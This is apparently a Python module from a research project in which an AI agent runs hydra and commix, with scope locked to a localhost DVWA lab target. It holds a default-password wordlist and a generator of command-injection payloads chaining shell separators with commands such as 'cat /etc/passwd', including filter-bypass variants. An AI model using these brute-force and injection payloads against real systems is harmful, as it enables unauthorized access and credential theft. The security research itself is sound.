"""Tier-2 offensive tool wrappers (plan12.md): the agent orchestrates real
pentest tools via RUN_TOOL instead of only hand-rolling one HTTP payload per
iteration. Two capabilities live here -- credential brute force ("hydra") and
OS command injection ("commix") -- because the laptop sweep showed those two
classes were where the full system (L3) regressed BELOW the base: the scaffold
spent its scarce iterations on recon/wrong-tool calls and ran out of budget
before trying enough real attacks (brute_medium 100%->0%).

Design rules kept from the rest of the action layer:

1. **Scope-locked.** A real external binary is only ever pointed at the
   configured localhost DVWA target, checked through ScopeGuard before the
   process starts. There is no argument that lets one reach another host.
2. **Oracle-grounded, never self-report.** These wrappers EXECUTE and return raw
   output; the Orchestrator handler decides success by replaying the result
   through the SAME interpret_* oracle every other action uses (an authenticated
   login re-checked by interpret_brute_response; a command re-checked by
   interpret_cmdi). A tool claiming "found it" never by itself marks the run
   successful -- so a tool-augmented success is measured identically to a
   hand-rolled one, and the research comparison stays honest.
3. **Batch, not per-iteration.** One RUN_TOOL call sweeps a whole candidate list
   in a single step, which is the actual fix for the budget-starvation failure:
   the agent no longer burns one iteration per password/payload.
4. **Graceful when absent.** If the binary is missing the wrapper returns a
   signal, never raises -- the handler then falls back to a pure-Python sweep
   over the same candidates (token-aware, so it works at DVWA High too), which
   is what actually grounds success. The real binary is the discovery engine
   where present; the Python path guarantees reliability and a valid oracle check.
"""

from __future__ import annotations

import re
import shutil
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

from src.action.scope_guard import ScopeGuard

# Small, curated candidate lists. Deliberately short: this is a lab demonstrator
# against DVWA (known-weak), not a production cracker. DVWA's own default is
# admin/password; the rest are the most common real-world defaults/top passwords
# so the brute is realistic without becoming a load test (batasan: no DoS).
BUILTIN_USERS = ["admin", "gordonb", "1337", "pablo", "smithy", "user", "test"]
BUILTIN_PASSWORDS = [
    "password", "admin", "123456", "123456789", "12345", "qwerty", "abc123",
    "letmein", "welcome", "admin123", "password123", "root", "toor", "pass",
    "charley", "letmein123", "monkey", "dragon", "football", "iloveyou",
    "changeme", "test", "guest", "1234", "12345678",
]

# OS-command-injection vectors: a shell separator chaining a command whose output
# only an executed shell produces. Ordered easy->hard so DVWA Low/Medium hit early
# and the filter-bypassing variants (no spaces, encoded, newline) cover High. The
# distinctive command is a directory listing / id so interpret_cmdi's markers fire.
_CMDI_CMDS_NIX = ["id", "uname -a", "cat /etc/passwd", "ls -la /"]
_CMDI_CMDS_WIN = ["dir", "ipconfig", "systeminfo"]
_CMDI_SEPARATORS = ["; {c}", "&& {c}", "| {c}", "& {c}", "\n{c}", "|{c}", "%0a{c}"]


@dataclass
class ToolExec:
    """Raw result of a real-binary run. `parsed` carries anything the wrapper
    could extract (e.g. a found credential); success is NOT decided here."""
    ran: bool                         # did the binary actually execute?
    returncode: int = -1
    stdout: str = ""
    stderr: str = ""
    command: list[str] = field(default_factory=list)
    parsed: dict = field(default_factory=dict)


def _find(*names: str) -> str | None:
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None


class HydraRunner:
    """Best-effort wrapper around THC-hydra for DVWA's login brute force. Works
    for Low/Medium (http-get-form, no anti-CSRF token). High has a per-request
    user_token hydra cannot track, so the handler skips the binary there and uses
    the Python token-aware sweep instead."""

    def __init__(self, allowlist: list[str], timeout_s: int = 90):
        self.guard = ScopeGuard(allowlist)
        self.timeout_s = timeout_s
        self.binary = _find("hydra")

    def available(self) -> bool:
        return self.binary is not None

    def run(self, host: str, path: str, body: str, fail_string: str,
            cookie: str, users: list[str], passwords: list[str]) -> ToolExec:
        self.guard.check(host)
        if not self.available():
            return ToolExec(ran=False, stderr="hydra binary not found on PATH")
        # Passwords -> temp file (hydra -P). Users inline via -L file too.
        tmp = Path(tempfile.mkdtemp(prefix="hydra_"))
        pfile = tmp / "pass.txt"; pfile.write_text("\n".join(passwords), encoding="utf-8")
        ufile = tmp / "user.txt"; ufile.write_text("\n".join(users), encoding="utf-8")
        form = f"{path}:{body}:{fail_string}:H=Cookie: {cookie}"
        args = [self.binary, "-L", str(ufile), "-P", str(pfile), "-f", "-t", "4",
                host, "http-get-form", form]
        try:
            proc = subprocess.run(args, capture_output=True, text=True, timeout=self.timeout_s)
        except subprocess.TimeoutExpired:
            return ToolExec(ran=True, returncode=-9, stderr="hydra timed out", command=args)
        except Exception as exc:  # pragma: no cover - defensive
            return ToolExec(ran=False, stderr=f"hydra failed to start: {exc}", command=args)
        cred = None
        m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", proc.stdout)
        if m:
            cred = {"user": m.group(1), "password": m.group(2)}
        return ToolExec(ran=True, returncode=proc.returncode, stdout=proc.stdout,
                        stderr=proc.stderr, command=args, parsed={"cred": cred})


class CommixRunner:
    """Best-effort wrapper around commix for OS command injection. Used only as a
    discovery signal folded into the observation; success is grounded by the
    handler re-sending a marker command and checking interpret_cmdi."""

    def __init__(self, allowlist: list[str], timeout_s: int = 120):
        self.guard = ScopeGuard(allowlist)
        self.timeout_s = timeout_s
        self.binary = _find("commix", "commix.py")

    def available(self) -> bool:
        return self.binary is not None

    def run(self, url: str, cookie: str, data: str | None = None) -> ToolExec:
        self.guard.check(url)
        if not self.available():
            return ToolExec(ran=False, stderr="commix binary not found on PATH")
        args = [self.binary, "-u", url, "--cookie", cookie, "--batch",
                "--skip-waf", "--timeout", "10"]
        if data:
            args += ["--data", data]
        try:
            proc = subprocess.run(args, capture_output=True, text=True, timeout=self.timeout_s)
        except subprocess.TimeoutExpired:
            return ToolExec(ran=True, returncode=-9, stderr="commix timed out", command=args)
        except Exception as exc:  # pragma: no cover - defensive
            return ToolExec(ran=False, stderr=f"commix failed to start: {exc}", command=args)
        found = bool(re.search(r"is vulnerable|command injection", proc.stdout, re.IGNORECASE))
        return ToolExec(ran=True, returncode=proc.returncode, stdout=proc.stdout,
                        stderr=proc.stderr, command=args, parsed={"found": found})


def cmdi_payloads(windows: bool = True) -> list[str]:
    """The ordered command-injection payloads the commix tool sweeps. Host-aware:
    the Kali pod is Linux (so *nix commands come first) but the Windows set stays
    for a XAMPP-on-Windows target. interpret_cmdi recognises both output styles."""
    cmds = (_CMDI_CMDS_NIX + _CMDI_CMDS_WIN) if not windows else (_CMDI_CMDS_WIN + _CMDI_CMDS_NIX)
    out: list[str] = []
    for sep in _CMDI_SEPARATORS:
        for c in cmds:
            out.append(sep.format(c=c))
    return out
